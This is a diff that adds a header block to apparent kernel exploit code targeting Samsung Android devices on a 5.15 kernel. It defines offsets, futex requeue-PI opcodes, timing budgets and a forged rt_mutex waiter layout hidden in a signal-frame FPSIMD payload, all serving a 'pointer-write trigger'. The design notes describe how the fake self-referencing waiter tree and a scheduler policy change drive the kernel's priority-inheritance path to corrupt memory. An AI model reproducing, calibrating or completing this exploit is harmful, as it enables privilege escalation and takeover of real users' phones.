@@ -572,4 +572,173 @@
 #define FOPS_SPLICE_READ_OFF 0xc8
 #define FOPS_SHOW_FDINFO_OFF 0xe0
 
+/* =========================================================================
+ * FUTEX PI v14 POINTER-WRITE TRIGGER (src/futex_pi_v14.c)
+ *
+ * NOT YET ENABLED. Nothing in the live path calls futex_pi_v14_trigger();
+ * src/fops.c still runs the CFI stage, which currently panics the kernel on
+ * most boots (reboot immediately after "CFI owner read ret=8 value=0"). Cutover
+ * is a separate, reviewed step: this block only makes the trigger COMPILE and
+ * makes its constants auditable, it does not run it.
+ *
+ * -------------------------------------------------------------------------
+ * PROVENANCE of every value below
+ * -------------------------------------------------------------------------
+ * A. Kernel-ABI offsets, read from THIS device's own vmlinux.btf
+ *    (C:\Users\admin\AppData\Local\Temp\opencode\gzh2\vmlinux.btf, 139553 type
+ *    records, GZE5/GZH2 same kernel build 5.15.189-android13-8-33404244).
+ *    BTF member 'off' is in BITS; every value here is BTF_off/8. Struct
+ *    'size' is in BYTES and is NOT divided.
+ *
+ *      struct rt_mutex_base        sizeof 0x20   wait_lock 0x00
+ *                                               waiters   0x08
+ *                                               owner     0x18
+ *      struct rt_mutex             sizeof 0x20   vlen 1, only member is
+ *                                               'rtmutex' -> proves
+ *                                               CONFIG_RT_MUTEXES=y
+ *      struct rt_mutex_waiter      sizeof 0x58   tree_entry    0x00
+ *                                               pi_tree_entry 0x18
+ *                                               task          0x30
+ *                                               lock          0x38
+ *                                               wake_state    0x40
+ *                                               prio          0x44
+ *                                               deadline      0x48
+ *                                               ww_ctx        0x50
+ *      struct rb_node              sizeof 0x18   __rb_parent_color 0x00
+ *                                               rb_right        0x08
+ *                                               rb_left         0x10
+ *      struct rb_root_cached       sizeof 0x10   rb_root    0x00
+ *                                               rb_leftmost 0x08
+ *      struct task_struct         sizeof 0x1200  pi_lock      0x884
+ *                                               pi_waiters   0x898
+ *                                               prio         0x7c
+ *                                               normal_prio  0x84
+ *                                               policy       0x420
+ *                                               pi_top_task  0x8a8
+ *                                               pi_blocked_on 0x8b0
+ *                                               robust_list  0x990
+ *                                               pi_state_list 0x9a0
+ *      struct fpsimd_context       sizeof 0x210  head 0x00 fpsr 0x08
+ *                                               fpcr 0x0c vregs 0x10
+ *      struct sigcontext           sizeof 0x1120 __reserved 0x120 (4096 B)
+ *
+ *    CONSEQUENCES worth stating because two of them contradict the usual
+ *    "documented" 5.15 story:
+ *      - task_struct HAS NO 'pi_state' MEMBER on this kernel. CONFIG_RT_MUTEXES
+ *        moved the PI bookkeeping into the per-futex object: 'pi_state' in
+ *        this kernel is struct futex_q.pi_state (futex_q+0x50), a pointer to
+ *        struct futex_pi_state, whose pi_mutex (rt_mutex_base) sits at
+ *        futex_pi_state+0x10. task_struct instead has pi_state_list at 0x9a0.
+ *      - task_struct HAS NO 'exit_lock' MEMBER, anywhere in the BTF. exit_lock
+ *        is pre-5.10; on 5.15 that job is done by pi_blocked_on + the
+ *        scheduling tree, and rt_mutex_adjust_pi() is its only entry point.
+ *      - struct robust_list is 8 bytes with a single member 'next'
+ *        (robust_list+0x00), and task_struct.robust_list is at 0x990. The v14
+ *        route does not touch it (see futex_pi_v14.c).
+ *      - struct fpsimd_context is 0x210, NOT 0x108: vregs is __uint128_t[32]
+ *        = 0x200 bytes, so vregs spans 0x10..0x20F and the 0x200-byte payload
+ *        fits it exactly without touching fpsr/fpcr. Cross-checked against
+ *        arch/arm64/include/uapi/asm/sigcontext.h in the stock source and
+ *        against the NDK's asm/sigcontext.h, which are byte-identical.
+ *
+ * B. UAPI, not device-specific, but pinned here so the route is self-describing
+ *    (include/uapi/linux/futex.h, include/linux/futex.h):
+ *      FUTEX_LOCK_PI 6, FUTEX_UNLOCK_PI 7, FUTEX_WAIT_REQUEUE_PI 11,
+ *      FUTEX_CMP_REQUEUE_PI 12, FUTEX_PRIVATE_FLAG 128.
+ *    The reference deliberately issues ops 11 and 12 WITHOUT
+ *    FUTEX_PRIVATE_FLAG, i.e. shared-keyed futexes. Kept verbatim: the
+ *    FUTEX_CMP_REQUEUE_PI/EAGAIN handshake is calibrated to the shared key
+ *    derivation, and switching to |FUTEX_PRIVATE_FLAG changes the key.
+ *
+ * C. Signal-frame record ABI (arch/arm64/include/uapi/asm/sigcontext.h, and
+ *    identical in the NDK header used to compile this):
+ *      FPSIMD_MAGIC 0x46508001, sizeof(struct _aarch64_ctx) 8.
+ *    The record is found by WALKING the sigcontext record list at runtime
+ *    (__reserved + 0x120), so there is no compile-time record offset at all.
+ *
+ * D. Stage field offsets inside the 0x200-byte FPSIMD payload. The payload is
+ *    byte-identical to the reference's 06_signal_frame_payload.c. Its
+ *    structure, re-derived from the BTF layouts above:
+ *      payload+0x10  struct rt_mutex_base   (0x20 B, overlaps the waiter)
+ *      payload+0x18  struct rt_mutex_waiter (0x58 B, 0x18..0x6F)
+ *    The two objects deliberately SHARE one rb_node at payload+0x18, which is
+ *    simultaneously rt_mutex_base.waiters.rb.rb_node (+0x08 -> 0x18) and
+ *    rt_mutex_waiter.tree_entry (+0x00 -> 0x18). That is what makes a
+ *    one-node waiters tree self-consistent: the root points at itself and
+ *    rb_leftmost points at itself too. Every stage offset below is that
+ *    structure, field by field:
+ *      0x18 SIGNAL_TREE_PARENT     = rb_node.rb_parent_color   (+0x00)
+ *      0x20 SIGNAL_TREE_RIGHT      = rb_node.rb_right         (+0x08)
+ *      0x28 SIGNAL_TREE_LEFT       = rb_node.rb_left          (+0x10)
+ *      0x30 SIGNAL_PI_TREE_PARENT  = rb_node.rb_parent_color  (+0x18)
+ *      0x38 SIGNAL_PI_TREE_RIGHT   = rb_node.rb_right         (+0x20)
+ *      0x40 SIGNAL_PI_TREE_LEFT    = rb_node.rb_left          (+0x28)
+ *      0x48 SIGNAL_TASK            = task                     (+0x30)
+ *      0x50 SIGNAL_LOCK            = lock                     (+0x38)
+ *      0x58 SIGNAL_WAKE_STATE      = wake_state               (+0x40)
+ *      0x5c SIGNAL_PRIO            = prio                     (+0x44)
+ *      0x60 SIGNAL_DEADLINE        = deadline                 (+0x48)
+ *      0x68 SIGNAL_WW_CTX          = ww_ctx                   (+0x50)
+ *      0x70 SIGNAL_RT_MUTEX_OWNER  = rt_mutex_base.owner      (+0x18 of
+ *                                        the rt_mutex_base at 0x10)
+ *    NOTE the reference expresses the wake_state+prio pair as ONE 64-bit
+ *    store (TARGET_SIGNAL_RB_TAG 0x8200000000), which is the same two fields:
+ *    low u32 wake_state = 0, high u32 prio = 0x82. Kept as a single store
+ *    because the two fields share one 8-byte straddle on aarch64 and one
+ *    store is strictly safer than two.
+ *
+ * E. Timing / handshake budgets, copied from the reference's
+ *    target_fuzz_v14 numbers for the S918B it was calibrated on. THEY HAVE NOT
+ *    BEEN RECALIBRATED FOR F946B and are the single most likely reason a first
+ *    run would not reproduce. They live here precisely so recalibration is a
+ *    one-line change rather than a code change.
+ * ========================================================================= */
+
+/* --- (D) FPSIMD signal-frame payload layout ------------------------------- */
+#define FUTEX_PI_V14_SIGNAL_PAYLOAD_SIZE 0x200U
+#define FUTEX_PI_V14_SIGNAL_LOCK_BASE 0x10U   /* rt_mutex_base base */
+#define FUTEX_PI_V14_SIGNAL_WAITER_BASE 0x18U /* rt_mutex_waiter base */
+#define FUTEX_PI_V14_SIGNAL_TREE_PARENT 0x18U
+#define FUTEX_PI_V14_SIGNAL_TREE_RIGHT 0x20U
+#define FUTEX_PI_V14_SIGNAL_TREE_LEFT 0x28U
+#define FUTEX_PI_V14_SIGNAL_PI_TREE_PARENT 0x30U
+#define FUTEX_PI_V14_SIGNAL_PI_TREE_RIGHT 0x38U
+#define FUTEX_PI_V14_SIGNAL_PI_TREE_LEFT 0x40U
+#define FUTEX_PI_V14_SIGNAL_TASK 0x48U
+#define FUTEX_PI_V14_SIGNAL_LOCK 0x50U
+#define FUTEX_PI_V14_SIGNAL_WAKE_STATE 0x58U
+#define FUTEX_PI_V14_SIGNAL_PRIO 0x5cU
+#define FUTEX_PI_V14_SIGNAL_DEADLINE 0x60U
+#define FUTEX_PI_V14_SIGNAL_WW_CTX 0x68U
+#define FUTEX_PI_V14_SIGNAL_RT_MUTEX_OWNER 0x70U
+/* wake_state (low u32) = TASK_NORMAL 0, prio (high u32) = 130. */
+#define FUTEX_PI_V14_SIGNAL_WAKE_STATE_PRIO 0x8200000000ULL
+
+/* --- (B) FUTEX ABI -------------------------------------------------------- */
+#define FUTEX_PI_V14_OP_LOCK_PI 6
+#define FUTEX_PI_V14_OP_UNLOCK_PI 7
+#define FUTEX_PI_V14_OP_WAIT_REQUEUE_PI 11
+#define FUTEX_PI_V14_OP_CMP_REQUEUE_PI 12
+
+/* --- (C) ARM64 signal-frame record ABI ----------------------------------- */
+#define FUTEX_PI_V14_FPSIMD_MAGIC 0x46508001U
+#define FUTEX_PI_V14_AARCH64_CTX_SIZE 8U
+#define FUTEX_PI_V14_FPSIMD_VREGS_OFF 0x10U
+#define FUTEX_PI_V14_FPSIMD_VREGS_SIZE 0x200U
+
+/* --- (E) handshake budgets (NOT recalibrated for F946B) ------------------ */
+#define FUTEX_PI_V14_WAIT_SEC 8
+#define FUTEX_PI_V14_POLL_USEC 1000
+#define FUTEX_PI_V14_PAUSE_USEC 100000
+#define FUTEX_PI_V14_READY_TIMEOUT_MS 5000
+#define FUTEX_PI_V14_GATE_TIMEOUT_MS 2000
+#define FUTEX_PI_V14_LONG_SPIN_MAX 0x3b9ac9ffULL
+/* Consumer-side pre-sched_setattr spin, in cntvct cycles. */
+#define FUTEX_PI_V14_DELAY_CYCLES 0ULL
+/* sched_policy written by the critical sched_setattr. 3 = SCHED_BATCH: the
+ * policy CHANGE is what forces the scheduler to take the rt_mutex_adjust_pi()
+ * path; setting only a nice value does not. */
+#define FUTEX_PI_V14_SETAUNCH_POLICY 3
+#define FUTEX_PI_V14_SETAUNCH_NICE 1
+
 #endif
